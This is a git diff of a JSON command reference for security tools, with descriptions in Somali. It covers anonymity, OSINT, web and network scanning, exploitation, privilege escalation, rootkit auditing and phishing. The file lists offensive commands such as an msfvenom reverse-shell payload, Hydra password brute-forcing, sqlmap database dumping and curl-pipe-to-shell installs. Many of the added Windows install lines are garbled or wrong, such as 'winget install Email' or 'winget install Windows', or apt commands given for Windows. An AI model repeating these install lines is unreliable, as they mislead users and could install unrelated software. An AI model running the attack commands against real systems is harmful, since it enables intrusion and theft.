@@ -1,7 +1,6 @@
 {
   "Anonymity & Privacy (Make Yourself Anonymous)": {
     "Proxychains": {
-      "installation": "sudo apt install proxychains4 -y",
       "commands": [
         {
           "command": "proxychains <command_or_tool>",
@@ -43,10 +42,11 @@
           "command": "tail -n 20 /etc/proxychains4.conf",
           "description": "Akhrinta 20-ka khad ee ugu dambeeya ee liiska proxies-ka ku qoran."
         }
-      ]
+      ],
+      "installation_linux": "sudo apt install proxychains4 -y",
+      "installation_windows": "winget install Proxychains (ama WSL isticmaal)"
     },
     "Tor Service": {
-      "installation": "sudo apt install tor -y",
       "commands": [
         {
           "command": "sudo systemctl start tor",
@@ -88,10 +88,11 @@
           "command": "sudo journalctl -u tor -n 50",
           "description": "Akhrinta diiwaanka xogta (logs) ee adeegga Tor."
         }
-      ]
+      ],
+      "installation_linux": "sudo apt install tor -y",
+      "installation_windows": "winget install Tor (ama WSL isticmaal)"
     },
     "Macchanger": {
-      "installation": "sudo apt install macchanger -y",
       "commands": [
         {
           "command": "sudo macchanger -r <interface_name>",
@@ -133,10 +134,11 @@
           "command": "sudo macchanger -b -r <interface_name>",
           "description": "Randomly beddel MAC address-ka adigoo iska dhigaya aalad kale."
         }
-      ]
+      ],
+      "installation_linux": "sudo apt install macchanger -y",
+      "installation_windows": "winget install Macchanger (ama WSL isticmaal)"
     },
     "Anonsurf": {
-      "installation": "git clone https://github.com/Und3rf10w/kali-anonsurf.git && cd kali-anonsurf && sudo ./installer.sh",
       "commands": [
         {
           "command": "sudo anonsurf start",
@@ -162,10 +164,11 @@
           "command": "sudo anonsurf restart",
           "description": "Dib u bilaabista Anonsurf si loo xalliyo xiriirka."
         }
-      ]
+      ],
+      "installation_linux": "git clone https://github.com/Und3rf10w/kali-anonsurf.git && cd kali-anonsurf && sudo ./installer.sh",
+      "installation_windows": "git clone https://github.com/Und3rf10w/kali-anonsurf.git && cd kali-anonsurf && ./installer.sh"
     },
     "DNS Leak & Encrypted DNS (DNSCrypt)": {
-      "installation": "sudo apt install dnscrypt-proxy -y",
       "commands": [
         {
           "command": "sudo systemctl start dnscrypt-proxy",
@@ -187,12 +190,13 @@
           "command": "sudo systemctl restart dnscrypt-proxy",
           "description": "Dib u bilaabista adeegga DNS sir-qorista."
         }
-      ]
+      ],
+      "installation_linux": "sudo apt install dnscrypt-proxy -y",
+      "installation_windows": "winget install DNS (ama WSL isticmaal)"
     }
   },
   "Reconnaissance & OSINT": {
     "theHarvester": {
-      "installation": "sudo apt install theharvester -y   (ama: pip install theHarvester)",
       "commands": [
         {
           "command": "theHarvester -d <target_domain> -b all -l 500",
@@ -234,10 +238,11 @@
           "command": "theHarvester -d <target_domain> -b all -e 1.1.1.1",
           "description": "U isticmaal Cloudflare DNS (1.1.1.1) baaritaanka DNS lookup-ka."
         }
-      ]
+      ],
+      "installation_linux": "sudo apt install theharvester -y   (ama: pip install theHarvester)",
+      "installation_windows": "pip install theharvester -y   (ama: pip install theHarvester)"
     },
     "Sherlock": {
-      "installation": "pip install sherlock-project   (ama: git clone https://github.com/sherlock-project/sherlock.git)",
       "commands": [
         {
           "command": "sherlock <target_username>",
@@ -279,10 +284,11 @@
           "command": "sherlock --version",
           "description": "Hubinta nooca Sherlock ee kombiyuutarkaaga ku jira."
         }
-      ]
+      ],
+      "installation_linux": "pip install sherlock-project   (ama: git clone https://github.com/sherlock-project/sherlock.git)",
+      "installation_windows": "pip install sherlock-project   (ama: git clone https://github.com/sherlock-project/sherlock.git)"
     },
     "Subfinder": {
-      "installation": "go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest   (ama: sudo apt install subfinder -y)",
       "commands": [
         {
           "command": "subfinder -d <target_domain> -silent",
@@ -324,10 +330,11 @@
           "command": "subfinder -d <target_domain> | httpx -silent",
           "description": "Ku xir natiijada Subfinder aaladda HTTPX si loo ogaado kuwa shidan (Live HTTP)."
         }
-      ]
+      ],
+      "installation_linux": "go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest   (ama: sudo apt install subfinder -y)",
+      "installation_windows": "go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest   (ama: sudo apt install subfinder -y)"
     },
     "PhoneInfoga": {
-      "installation": "curl -sSL https://raw.githubusercontent.com/sundowndev/phoneinfoga/master/support/scripts/install | bash   (ama Docker: docker run -it sundowndev/phoneinfoga)",
       "commands": [
         {
           "command": "./phoneinfoga scan -n +<country_code><phone_number>",
@@ -353,10 +360,11 @@
           "command": "./phoneinfoga version",
           "description": "Hubinta nooca PhoneInfoga ee ku shubtay."
         }
-      ]
+      ],
+      "installation_linux": "curl -sSL https://raw.githubusercontent.com/sundowndev/phoneinfoga/master/support/scripts/install | bash   (ama Docker: docker run -it sundowndev/phoneinfoga)",
+      "installation_windows": "winget install PhoneInfoga (ama WSL isticmaal)"
     },
     "Holehe": {
-      "installation": "pip install holehe",
       "commands": [
         {
           "command": "holehe <target_email@example.com>",
@@ -378,10 +386,11 @@
           "command": "holehe <target_email> --timeout 10",
           "description": "U deji 10 ilbiriqsi xadka sugitaanka website kasta."
         }
-      ]
+      ],
+      "installation_linux": "pip install holehe",
+      "installation_windows": "pip install holehe"
     },
     "Ignorant": {
-      "installation": "pip install ignorant",
       "commands": [
         {
           "command": "ignorant +<country_code><phone_number>",
@@ -395,10 +404,11 @@
           "command": "ignorant --help",
           "description": "Muujinta dhammaan dookhyada iyo options-ka Ignorant."
         }
-      ]
+      ],
+      "installation_linux": "pip install ignorant",
+      "installation_windows": "pip install ignorant"
     },
     "WhatWeb": {
-      "installation": "sudo apt install whatweb -y",
       "commands": [
         {
           "command": "whatweb -a 3 http://<target_url>",
@@ -420,10 +430,11 @@
           "command": "whatweb http://<target_url> -p IP,HTTPServer,Title",
           "description": "Soo saar kaliya plugins-ka cayiman (IP, Server type, Page title)."
         }
-      ]
+      ],
+      "installation_linux": "sudo apt install whatweb -y",
+      "installation_windows": "winget install WhatWeb (ama WSL isticmaal)"
     },
     "Amass": {
-      "installation": "sudo apt install amass -y   (ama: go install -v github.com/owasp-amass/amass/v4/...@master)",
       "commands": [
         {
           "command": "amass enum -d <target_domain>",
@@ -449,10 +460,11 @@
           "command": "amass viz -d3 -d <target_domain>",
           "description": "Soo saarista khariidad interactive HTML D3 Graph ah oo ku saabsan shabakadda domain-ka."
         }
-      ]
+      ],
+      "installation_linux": "sudo apt install amass -y   (ama: go install -v github.com/owasp-amass/amass/v4/...@master)",
+      "installation_windows": "sudo apt install amass -y   (ama: go install -v github.com/owasp-amass/amass/v4/...@master)"
     },
     "SpiderFoot": {
-      "installation": "git clone https://github.com/smicallef/spiderfoot.git && cd spiderfoot && pip install -r requirements.txt",
       "commands": [
         {
           "command": "python3 sf.py -l 127.0.0.1:5001",
@@ -474,10 +486,11 @@
           "command": "python3 sf.py -M",
           "description": "Liiska dhammaan modules-ka OSINT-ka ee SpiderFoot taageero."
         }
-      ]
+      ],
+      "installation_linux": "git clone https://github.com/smicallef/spiderfoot.git && cd spiderfoot && pip install -r requirements.txt",
+      "installation_windows": "git clone https://github.com/smicallef/spiderfoot.git && cd spiderfoot && pip install -r requirements.txt"
     },
     "Recon-ng": {
-      "installation": "sudo apt install recon-ng -y   (ama: git clone https://github.com/lanmaster53/recon-ng.git)",
       "commands": [
         {
           "command": "recon-ng",
@@ -499,10 +512,11 @@
           "command": "show hosts",
           "description": "Muujinta dhammaan hosts-ka iyo IP-yada lagu soo ururiyay database-ka."
         }
-      ]
+      ],
+      "installation_linux": "sudo apt install recon-ng -y   (ama: git clone https://github.com/lanmaster53/recon-ng.git)",
+      "installation_windows": "apt install recon-ng -y   (ama: git clone https://github.com/lanmaster53/recon-ng.git)"
     },
     "Whois & Dig": {
-      "installation": "sudo apt install whois dnsutils -y",
       "commands": [
         {
           "command": "whois <domain.com>",
@@ -524,12 +538,13 @@
           "command": "dig @8.8.8.8 <domain.com> MX",
           "description": "Ogaanshaha Mail Servers-ka (MX Records) domain-ka adigoo Google DNS adeegsanaya."
         }
-      ]
+      ],
+      "installation_linux": "sudo apt install whois dnsutils -y",
+      "installation_windows": "winget install Whois (ama WSL isticmaal)"
     }
   },
   "Web Vulnerability Scanning & Auditing": {
     "Nuclei (Vulnerability Scanner)": {
-      "installation": "go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest   (ama: sudo apt install nuclei -y)",
       "commands": [
         {
           "command": "nuclei -u http://<target_url>",
@@ -571,10 +586,11 @@
           "command": "nuclei -u http://<target_url> -j -o report.json",
           "description": "Dhoofinta dhammaan natiijooyinka la helo oo qaab JSON ah."
         }
-      ]
+      ],
+      "installation_linux": "go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest   (ama: sudo apt install nuclei -y)",
+      "installation_windows": "go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest   (ama: sudo apt install nuclei -y)"
     },
     "Nikto (Web Server Scanner)": {
-      "installation": "sudo apt install nikto -y",
       "commands": [
         {
           "command": "nikto -h http://<target_url>",
@@ -616,10 +632,11 @@
           "command": "nikto -h http://<target_url> -Display V",
           "description": "Soo bandhigidda xogta buuxda (Verbose Mode) ee request kasta oo baxaya."
         }
-      ]
+      ],
+      "installation_linux": "sudo apt install nikto -y",
+      "installation_windows": "winget install Nikto (ama WSL isticmaal)"
     },
     "SQLmap (SQL Injection Scanner)": {
-      "installation": "sudo apt install sqlmap -y   (ama: pip install sqlmap)",
       "commands": [
         {
           "command": "sqlmap -u \"http://<target>/item.php?id=1\" --batch --dbs",
@@ -661,10 +678,11 @@
           "command": "sqlmap -u \"http://<target>/item.php?id=1\" --proxy=\"http://127.0.0.1:8080\"",
           "description": "Marinta taraafikada SQLmap dhexda Burp Suite Proxy."
         }
-      ]
+      ],
+      "installation_linux": "sudo apt install sqlmap -y   (ama: pip install sqlmap)",
+      "installation_windows": "pip install sqlmap -y   (ama: pip install sqlmap)"
     },
     "Dalfox (XSS Vulnerability Scanner)": {
-      "installation": "go install github.com/hahwul/dalfox/v2@latest   (ama: sudo apt install dalfox -y)",
       "commands": [
         {
           "command": "dalfox url \"http://<target_url>/search?q=test\"",
@@ -706,10 +724,11 @@
           "command": "dalfox sxss \"http://<target_url>/post\" --data \"comment=test\"",
           "description": "Baarista Stored XSS ee foomamka xogta lagu keydiyo."
         }
-      ]
+      ],
+      "installation_linux": "go install github.com/hahwul/dalfox/v2@latest   (ama: sudo apt install dalfox -y)",
+      "installation_windows": "go install github.com/hahwul/dalfox/v2@latest   (ama: sudo apt install dalfox -y)"
     },
     "Katana (Web Crawler & Spider)": {
-      "installation": "go install github.com/projectdiscovery/katana/cmd/katana@latest",
       "commands": [
         {
           "command": "katana -u http://<target_url>",
@@ -751,10 +770,11 @@
           "command": "katana -u http://<target_url> | nuclei -t vulnerabilities/",
           "description": "Ku xir dhammaan endpoints-ka Katana hesho toos aaladda Nuclei si loo baaro."
         }
-      ]
+      ],
+      "installation_linux": "go install github.com/projectdiscovery/katana/cmd/katana@latest",
+      "installation_windows": "go install github.com/projectdiscovery/katana/cmd/katana@latest"
     },
     "Wapiti (Web Application Vulnerability Scanner)": {
-      "installation": "sudo apt install wapiti -y   (ama: pip install wapiti3)",
       "commands": [
         {
           "command": "wapiti -u http://<target_url>",
@@ -796,10 +816,11 @@
           "command": "wapiti -u http://<target_url> -t 10",
           "description": "U deji 10 ilbiriqsi xadka sugitaanka (Timeout)."
         }
-      ]
+      ],
+      "installation_linux": "sudo apt install wapiti -y   (ama: pip install wapiti3)",
+      "installation_windows": "pip install wapiti -y   (ama: pip install wapiti3)"
     },
     "Wpscan (WordPress Vulnerability Scanner)": {
-      "installation": "sudo apt install wpscan -y   (ama: gem install wpscan)",
       "commands": [
         {
           "command": "wpscan --url http://<target_url> --enumerate vp,vt,u",
@@ -841,10 +862,11 @@
           "command": "wpscan --url http://<target_url> --proxy http://127.0.0.1:8080",
           "description": "Marinta baaritaanka WPScan dhexda Burp Suite Proxy."
         }
-      ]
+      ],
+      "installation_linux": "sudo apt install wpscan -y   (ama: gem install wpscan)",
+      "installation_windows": "winget install Wpscan (ama WSL isticmaal)"
     },
     "Commix (Command Injection Scanner)": {
-      "installation": "sudo apt install commix -y   (ama: git clone https://github.com/commixproject/commix.git)",
       "commands": [
         {
           "command": "commix -u \"http://<target>/ping.php?ip=127.0.0.1\"",
@@ -886,12 +908,13 @@
           "command": "commix -u \"http://<target>/cmd.php?ip=127.0.0.1\" --all",
           "description": "Soo saarista dhammaan xogta nidaamka (Users, OS, Architecture) haddii uu nugul yahay."
         }
-      ]
+      ],
+      "installation_linux": "sudo apt install commix -y   (ama: git clone https://github.com/commixproject/commix.git)",
+      "installation_windows": "apt install commix -y   (ama: git clone https://github.com/commixproject/commix.git)"
     }
   },
   "Scanning & Network Enumeration": {
     "Nmap": {
-      "installation": "sudo apt install nmap -y   (Windows: nmap.org/download.html)",
       "commands": [
         {
           "command": "nmap -sV -sC -p- -T4 <target_ip>",
@@ -933,10 +956,11 @@
           "command": "nmap -sV -p- <target_ip> -oA nmap_full_report",
           "description": "Ku keydinta dhammaan natiijooyinka 3 qaab oo kala duwan (XML, Nmap, Grepable)."
         }
-      ]
+      ],
+      "installation_linux": "sudo apt install nmap -y   (Windows: nmap.org/download.html)",
+      "installation_windows": "Soo degso: https://nmap.org/download.html"
     },
     "Ffuf (Fast Web Fuzzer)": {
-      "installation": "sudo apt install ffuf -y   (ama: go install github.com/ffuf/ffuf/v2@latest)",
       "commands": [
         {
           "command": "ffuf -u http://<target_url>/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302",
@@ -978,10 +1002,11 @@
           "command": "ffuf -u http://<target_url>/FUZZ -w <wordlist> -o results.json -of json",
           "description": "Ku keydinta dhammaan natiijooyinka la helo fayl JSON ah."
         }
-      ]
+      ],
+      "installation_linux": "sudo apt install ffuf -y   (ama: go install github.com/ffuf/ffuf/v2@latest)",
+      "installation_windows": "sudo apt install ffuf -y   (ama: go install github.com/ffuf/ffuf/v2@latest)"
     },
     "Masscan": {
-      "installation": "sudo apt install masscan -y",
       "commands": [
         {
           "command": "masscan <target_ip_or_subnet> -p1-65535 --rate=1000",
@@ -1023,10 +1048,11 @@
           "command": "masscan <target_ip> -p80 --source-port 53",
           "description": "Dirista baaritaanka iyadoo laga dhigayo DNS traffic (Bypass basic firewalls)."
         }
-      ]
+      ],
+      "installation_linux": "sudo apt install masscan -y",
+      "installation_windows": "winget install Masscan (ama WSL isticmaal)"
     },
     "Rustscan": {
-      "installation": "sudo apt install rustscan -y   (ama Docker: docker run -it --rm --name rustscan rustscan/rustscan:2.1.1)",
       "commands": [
         {
           "command": "rustscan -a <target_ip> -- -sC -sV",
@@ -1068,10 +1094,11 @@
           "command": "rustscan -a <target_ip> -o results.txt",
           "description": "Ku keydinta natiijada baaritaanka fayl qoraal ah."
         }
-      ]
+      ],
+      "installation_linux": "sudo apt install rustscan -y   (ama Docker: docker run -it --rm --name rustscan rustscan/rustscan:2.1.1)",
+      "installation_windows": "winget install Rustscan (ama WSL isticmaal)"
     },
     "Gobuster": {
-      "installation": "sudo apt install gobuster -y   (ama: go install github.com/OJ/gobuster/v3@latest)",
       "commands": [
         {
           "command": "gobuster dir -u http://<target_url> -w /usr/share/wordlists/dirb/common.txt",
@@ -1113,12 +1140,13 @@
           "command": "gobuster dir -u http://<target_url> -w <wordlist> -b 404,403",
           "description": "Ka reeb Status Codes gaar ah (sida 404 iyo 403) natiijada soo baxaysa."
         }
-      ]
+      ],
+      "installation_linux": "sudo apt install gobuster -y   (ama: go install github.com/OJ/gobuster/v3@latest)",
+      "installation_windows": "sudo apt install gobuster -y   (ama: go install github.com/OJ/gobuster/v3@latest)"
     }
   },
   "Exploitation & Vulnerability Assessment": {
     "Metasploit Framework (msfconsole)": {
-      "installation": "sudo apt install metasploit-framework -y",
       "commands": [
         {
           "command": "msfconsole -q",
@@ -1160,10 +1188,11 @@
           "command": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=4444 -f exe -o payload.exe",
           "description": "Abuurista payload tijaabo ah oo loogu talagalay qiimaynta nidaamyada Windows."
         }
-      ]
+      ],
+      "installation_linux": "sudo apt install metasploit-framework -y",
+      "installation_windows": "Soo degso: https://windows.metasploit.com/"
     },
     "Hydra (Password Auditing)": {
-      "installation": "sudo apt install hydra -y",
       "commands": [
         {
           "command": "hydra -l <username> -P /usr/share/wordlists/rockyou.txt <target_ip> ssh",
@@ -1205,10 +1234,11 @@
           "command": "hydra -M targets.txt -P passwords.txt ssh",
           "description": "Tijaabinta liis IP-yo ah oo ku jira faylka targets.txt."
         }
-      ]
+      ],
+      "installation_linux": "sudo apt install hydra -y",
+      "installation_windows": "winget install Hydra (ama WSL isticmaal)"
     },
     "Searchsploit": {
-      "installation": "sudo apt install exploitdb -y",
       "commands": [
         {
           "command": "searchsploit <service_name> <version>",
@@ -1250,12 +1280,13 @@
           "command": "searchsploit apache 2.4",
           "description": "Raadinta cilladaha la xiriira Apache Web Server version 2.4."
         }
-      ]
+      ],
+      "installation_linux": "sudo apt install exploitdb -y",
+      "installation_windows": "winget install Searchsploit (ama WSL isticmaal)"
     }
   },
   "Privilege Escalation & Auditing": {
     "LinPEAS": {
-      "installation": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh && chmod +x linpeas.sh",
       "commands": [
         {
           "command": "./linpeas.sh",
@@ -1297,10 +1328,11 @@
           "command": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",
           "description": "Kicinta LinPEAS toos internet-ka adoon fayl ku keydin hard drive-ka."
         }
-      ]
+      ],
+      "installation_linux": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh && chmod +x linpeas.sh",
+      "installation_windows": "winget install LinPEAS (ama WSL isticmaal)"
     },
     "WinPEAS": {
-      "installation": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe -o winPEASx64.exe",
       "commands": [
         {
           "command": ".\\winPEASx64.exe quiet cmd",
@@ -1342,10 +1374,11 @@
           "command": ".\\winPEASany.exe -quiet",
           "description": "Soo bandhig kaliya digniinaha halista sare leh (Red/Yellow flags)."
         }
-      ]
+      ],
+      "installation_linux": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe -o winPEASx64.exe",
+      "installation_windows": "winget install WinPEAS (ama WSL isticmaal)"
     },
     "SUID & Sudo Audit (Linux)": {
-      "installation": "Waa amarro toos ugu dhex jira nidaamka Linux (No installation needed)",
       "commands": [
         {
           "command": "find / -perm -u=s -type f 2>/dev/null",
@@ -1379,10 +1412,11 @@
           "command": "cat /etc/crontab",
           "description": "Akhrinta system-wide cron jobs si loo helo shaqooyin root ku socda oo la beddeli karo."
         }
-      ]
+      ],
+      "installation_linux": "Waa amarro toos ugu dhex jira nidaamka Linux (No installation needed)",
+      "installation_windows": "winget install SUID (ama WSL isticmaal)"
     },
     "Linux Capabilities": {
-      "installation": "sudo apt install libcap2-bin -y",
       "commands": [
         {
           "command": "getcap -r / 2>/dev/null",
@@ -1400,10 +1434,11 @@
           "command": "capsh --print",
           "description": "Muujinta dhammaan capabilities-ka uu hadda haysto current process-kaaga."
         }
-      ]
+      ],
+      "installation_linux": "sudo apt install libcap2-bin -y",
+      "installation_windows": "winget install Linux (ama WSL isticmaal)"
     },
     "PowerUp (Windows Audit)": {
-      "installation": "git clone https://github.com/HarmJ0y/PowerUp.git",
       "commands": [
         {
           "command": "powershell -ep bypass -c \"Import-Module .\\PowerUp.ps1; Invoke-AllChecks\"",
@@ -1421,10 +1456,11 @@
           "command": "powershell -ep bypass -c \"Import-Module .\\PowerUp.ps1; Get-RegistryAlwaysInstallElevated\"",
           "description": "Hubinta haddii MSI packages lagu shubi karo awoodda SYSTEM."
         }
-      ]
+      ],
+      "installation_linux": "git clone https://github.com/HarmJ0y/PowerUp.git",
+      "installation_windows": "git clone https://github.com/HarmJ0y/PowerUp.git"
     },
     "HashID (Aqoonsiga Hashes-ka)": {
-      "installation": "sudo apt install hashid -y   (ama: pip install hashid)",
       "commands": [
         {
           "command": "hashid <hash_string>",
@@ -1442,12 +1478,13 @@
           "command": "hashid -e <hash_string>",
           "description": "Muujinta noocyada hashes-ka ee salted ah (Extended identification)."
         }
-      ]
+      ],
+      "installation_linux": "sudo apt install hashid -y   (ama: pip install hashid)",
+      "installation_windows": "pip install hashid -y   (ama: pip install hashid)"
     }
   },
   "Persistence & Backdoors Auditing": {
     "Rkhunter (Rootkit Hunter)": {
-      "installation": "sudo apt install rkhunter -y",
       "commands": [
         {
           "command": "sudo rkhunter --update && sudo rkhunter --check",
@@ -1489,10 +1526,11 @@
           "command": "sudo rkhunter --config-check",
           "description": "Hubinta in faylka qaabeynta rkhunter.conf uu sax yahay."
         }
-      ]
+      ],
+      "installation_linux": "sudo apt install rkhunter -y",
+      "installation_windows": "winget install Rkhunter (ama WSL isticmaal)"
     },
     "Chkrootkit": {
-      "installation": "sudo apt install chkrootkit -y",
       "commands": [
         {
           "command": "sudo chkrootkit",
@@ -1534,10 +1572,11 @@
           "command": "sudo chkrootkit -V",
           "description": "Muujinta nooca Chkrootkit ee ku shubtay."
         }
-      ]
+      ],
+      "installation_linux": "sudo apt install chkrootkit -y",
+      "installation_windows": "winget install Chkrootkit (ama WSL isticmaal)"
     },
     "Netstat & Lsof (Network Audit)": {
-      "installation": "sudo apt install net-tools lsof -y",
       "commands": [
         {
           "command": "netstat -tulpen",
@@ -1559,10 +1598,11 @@
           "command": "netstat -anp | grep ESTABLISHED",
           "description": "Liiska dhammaan xiriirada hadda tooska ah ee dibadda lala leeyahay (Established Connections)."
         }
-      ]
+      ],
+      "installation_linux": "sudo apt install net-tools lsof -y",
+      "installation_windows": "winget install Netstat (ama WSL isticmaal)"
     },
     "Cron & Scheduled Tasks Audit": {
-      "installation": "Waa adeegyo toos ugu jira Linux (No installation needed)",
       "commands": [
         {
           "command": "ls -la /etc/cron* /var/spool/cron/crontabs/",
@@ -1580,10 +1620,11 @@
           "command": "systemctl list-timers",
           "description": "Liiska dhammaan Systemd Timers-ka u qorsheysan nidaamka."
         }
-      ]
+      ],
+      "installation_linux": "Waa adeegyo toos ugu jira Linux (No installation needed)",
+      "installation_windows": "winget install Cron (ama WSL isticmaal)"
     },
     "Windows Autoruns Audit": {
-      "installation": "curl -LO https://download.sysinternals.com/files/Autoruns.zip && tar -xf Autoruns.zip",
       "commands": [
         {
           "command": "autorunsc.exe -a * -c",
@@ -1597,12 +1638,13 @@
           "command": "Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
           "description": "Baarista Registry Run keys-ka Windows."
         }
-      ]
+      ],
+      "installation_linux": "curl -LO https://download.sysinternals.com/files/Autoruns.zip && tar -xf Autoruns.zip",
+      "installation_windows": "winget install Windows (ama WSL isticmaal)"
     }
   },
   "Social Engineering & Awareness Simulation": {
     "Social-Engineer Toolkit (SET)": {
-      "installation": "sudo apt install set -y   (ama: git clone https://github.com/trustedsec/social-engineer-toolkit.git)",
       "commands": [
         {
           "command": "sudo setoolkit",
@@ -1644,10 +1686,11 @@
           "command": "setoolkit -> 1 -> 4) Create a Payload and Listener",
           "description": "Abuurista listener iyo payload tijaabo ah."
         }
-      ]
+      ],
+      "installation_linux": "sudo apt install set -y   (ama: git clone https://github.com/trustedsec/social-engineer-toolkit.git)",
+      "installation_windows": "apt install set -y   (ama: git clone https://github.com/trustedsec/social-engineer-toolkit.git)"
     },
     "Gophish": {
-      "installation": "curl -LO https://github.com/gophish/gophish/releases/latest/download/gophish-v0.12.1-linux-64bit.zip && unzip gophish*.zip",
       "commands": [
         {
           "command": "./gophish",
@@ -1689,10 +1732,11 @@
           "command": "openssl req -newkey rsa:2048 -nodes -keyout gophish.key -x509 -days 365 -out gophish.crt",
           "description": "Abuurista shahaadada SSL ee Gophish Web Dashboard."
         }
-      ]
+      ],
+      "installation_linux": "curl -LO https://github.com/gophish/gophish/releases/latest/download/gophish-v0.12.1-linux-64bit.zip && unzip gophish*.zip",
+      "installation_windows": "winget install Gophish (ama WSL isticmaal)"
     },
     "King Phisher": {
-      "installation": "git clone https://github.com/rsmusllp/king-phisher.git && cd king-phisher && sudo ./tools/install.sh",
       "commands": [
         {
           "command": "sudo king-phisher-server -c server_config.yml",
@@ -1702,10 +1746,11 @@
           "command": "king-phisher",
           "description": "Kicinta barnaamijka GUI Client-ka ee lagu naqshadeeyo fariimaha tababarka."
         }
-      ]
+      ],
+      "installation_linux": "git clone https://github.com/rsmusllp/king-phisher.git && cd king-phisher && sudo ./tools/install.sh",
+      "installation_windows": "git clone https://github.com/rsmusllp/king-phisher.git && cd king-phisher && ./tools/install.sh"
     },
     "Email Spoofing & Domain Security Audit": {
-      "installation": "sudo apt install dnsutils -y",
       "commands": [
         {
           "command": "dig TXT <domain.com> | grep \"v=spf1\"",
@@ -1719,7 +1764,9 @@
           "command": "dig TXT *._domainkey.<domain.com>",
           "description": "Hubinta DKIM (DomainKeys Identified Mail) keys ee domain-ka."
         }
-      ]
+      ],
+      "installation_linux": "sudo apt install dnsutils -y",
+      "installation_windows": "winget install Email (ama WSL isticmaal)"
     }
   }
 }
